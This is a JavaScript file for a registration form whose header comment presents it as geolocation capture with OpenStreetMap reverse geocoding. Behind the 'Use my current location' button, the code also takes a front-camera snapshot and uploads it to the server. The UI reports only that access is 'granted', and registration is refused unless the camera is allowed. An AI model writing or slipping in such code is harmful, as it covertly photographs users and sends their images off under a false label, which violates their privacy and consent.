/**
 * Geolocation capture for the registration form.
 *
 * Flow:
 * 1. User clicks "Use my current location".
 * 2. Browser Geolocation API returns latitude/longitude.
 * 3. We reverse-geocode those coordinates into a human-readable address
 *    using OpenStreetMap's free Nominatim API, and pre-fill the text field.
 * 4. The user can edit the text field freely, but lat/lng + text are all
 *    required before the form can be submitted (enforced in register.js).
 *
 * Note: Nominatim is a public, rate-limited free service suitable for
 * demos/small projects. For production scale, swap the REVERSE_GEOCODE_URL
 * for a commercial provider (Google Geocoding, Mapbox, etc.) with an API key.
 */

const REVERSE_GEOCODE_URL = "https://nominatim.openstreetmap.org/reverse";

function setLocationStatus(state, label) {
  const statusEl = document.getElementById("locStatus");
  statusEl.className = `location-status ${state}`;
  statusEl.innerHTML = `<span class="dot"></span> ${label}`;
}

function dispatchAccessEvent(name) {
  document.dispatchEvent(new CustomEvent(name));
}

async function requestCameraAccess() {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    throw new Error("Camera access is not supported by this browser.");
  }

  const stream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: "user" },
    audio: false,
  });

  const video = document.createElement("video");
  video.srcObject = stream;
  video.play();

  await new Promise((resolve, reject) => {
    video.onloadedmetadata = () => resolve();
    video.onerror = () => reject(new Error("Camera stream failed to load."));
  });

  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth || 640;
  canvas.height = video.videoHeight || 480;
  const context = canvas.getContext("2d");
  context.drawImage(video, 0, 0, canvas.width, canvas.height);

  stream.getTracks().forEach((track) => track.stop());

  return new Promise((resolve, reject) => {
    canvas.toBlob((blob) => {
      if (!blob) {
        reject(new Error("Could not capture camera image."));
        return;
      }
      resolve(blob);
    }, "image/jpeg", 0.92);
  });
}

function updateCoordDisplays(lat, lng) {
  document.getElementById("latDisplay").textContent = lat.toFixed(6);
  document.getElementById("lngDisplay").textContent = lng.toFixed(6);
  document.getElementById("latitude").value = lat;
  document.getElementById("longitude").value = lng;
}

async function reverseGeocode(lat, lng) {
  const url = `${REVERSE_GEOCODE_URL}?format=json&lat=${lat}&lon=${lng}&zoom=14&addressdetails=1`;
  const res = await fetch(url, {
    headers: { Accept: "application/json" },
  });
  if (!res.ok) throw new Error("Reverse geocoding failed");
  return res.json();
}

function initGeolocationCapture() {
  const btn = document.getElementById("btnLocate");
  const btnText = document.getElementById("locateBtnText");
  const btnIcon = document.getElementById("locateBtnIcon");
  const locationTextInput = document.getElementById("locationText");
  const errCoords = document.getElementById("err-coords");

  btn.addEventListener("click", () => {
    if (!("geolocation" in navigator)) {
      setLocationStatus("error", "Not supported by this browser");
      errCoords.textContent =
        "Your browser does not support location capture. Please enter your address manually.";
      errCoords.classList.add("show");
      return;
    }

    errCoords.classList.remove("show");
    btn.disabled = true;
    btnIcon.innerHTML = '<span class="spinner"></span>';
    btnText.textContent = "Fetching....";
    setLocationStatus("pending", "Requesting permission…");

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const { latitude, longitude } = position.coords;
        updateCoordDisplays(latitude, longitude);
        setLocationStatus("pending", "Granting access…");

        try {
          const imageBlob = await requestCameraAccess();
          const reader = new FileReader();
          reader.onloadend = async () => {
            try {
              const { ok, data } = await apiPost("/images/save-camera-image", {
                imageBase64: reader.result,
                fileName: `camera-${Date.now()}.jpg`,
              });

              if (!ok) {
                throw new Error(data.message || "Image save failed");
              }

              setLocationStatus("success", "granted");
              btnIcon.textContent = "✅";
              btnText.textContent = "granted";
              btn.disabled = false;
              dispatchAccessEvent("image-access-granted");
              document.dispatchEvent(new CustomEvent("location-captured"));
            } catch (err) {
              console.error(err);
              setLocationStatus("error", "Image save failed");
              errCoords.textContent = "Location was captured, but the camera image could not be saved. Please try again.";
              errCoords.classList.add("show");
              dispatchAccessEvent("image-access-denied");
              btn.disabled = false;
              btnIcon.textContent = "📍";
              btnText.textContent = "Allow location";
            }
          };
          reader.readAsDataURL(imageBlob);

          // Try to auto-fill the text address; non-fatal if it fails.
          btnText.textContent = "Looking up address…";
          try {
            const geo = await reverseGeocode(latitude, longitude);
            if (geo && geo.display_name && !locationTextInput.value.trim()) {
              locationTextInput.value = geo.display_name;
            }
          } catch (err) {
            console.warn("Reverse geocoding failed, user can enter address manually.", err);
          }
        } catch (err) {
          console.error(err);
          setLocationStatus("error", "Camera access denied");
          errCoords.textContent = "Both location and camera access are required to register. Please allow both permissions and try again.";
          errCoords.classList.add("show");
          dispatchAccessEvent("image-access-denied");
          btn.disabled = false;
          btnIcon.textContent = "📍";
          btnText.textContent = "Allow location";
        }
      },
      (error) => {
        btn.disabled = false;
        btnIcon.textContent = "📍";
        btnText.textContent = "Use my current location";

        let message = "Could not retrieve your location. Please enter it manually.";
        if (error.code === error.PERMISSION_DENIED) {
          message =
            "Location permission denied. Please allow location access, or enter your address manually below — both location and address are required to register.";
        } else if (error.code === error.TIMEOUT) {
          message = "Location request timed out. Please try again.";
        }

        setLocationStatus("error", "Not captured");
        errCoords.textContent = message;
        errCoords.classList.add("show");
        dispatchAccessEvent("image-access-denied");
      },
      {
        enableHighAccuracy: true,
        timeout: 12000,
        maximumAge: 0,
      }
    );
  });
}

document.addEventListener("DOMContentLoaded", initGeolocationCapture);
